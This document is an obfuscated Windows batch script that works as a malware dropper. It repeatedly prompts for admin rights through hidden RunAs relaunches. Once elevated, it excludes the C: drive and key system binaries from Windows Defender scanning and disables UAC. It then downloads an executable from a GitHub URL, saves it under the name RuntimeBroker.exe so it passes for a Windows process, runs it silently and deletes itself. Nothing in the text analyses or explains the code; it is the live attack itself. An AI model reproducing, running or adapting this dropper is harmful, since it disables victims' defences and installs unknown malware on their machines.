@echo off & setlocal enableDelayedExpansion
set "JQB=2>&1" & set "YwCaR=SESSION" & set "oev=NET" & set "oMJ=>nul"
%oev% %YwCaR% %oMJ% %JQB%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "tOGOW=bar" & set "BON=qux" & set "wogQN=foo" & set "njI=baz" & rem bZIGaI pSxz Wyyr
set "ngT=powershell -ExecutionPolicy Bypass -Command"
set "gyuE=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "xGTsw='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "XmSzX='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!ngT! "!gyuE! !xGTsw! !XmSzX!" %oMJ% %JQB%
set "ZVi=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "bUZ=-Name 'EnableLUA' -Value 0"
!ngT! "!ZVi! !bUZ!" %oMJ% %JQB%
set "YQKCw=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!ngT! "!YQKCw!" %oMJ% %JQB%
if !errorlevel! neq 0 (goto %a%)
set "Tzcv=timeout /t" & !Tzcv! 2 %oMJ% %JQB%
set "iXZ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "rws=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "ztb=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!ngT! "!iXZ! !rws! !ztb!" %oMJ% %JQB%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!Tzcv! 1 %oMJ% %JQB% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %oMJ% %JQB%
del /f /q "%~f0" %oMJ% %JQB%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %oMJ% %JQB%
if !errorlevel! neq 0 (!Tzcv! 3 %oMJ% %JQB% & goto %b%)
exit /b
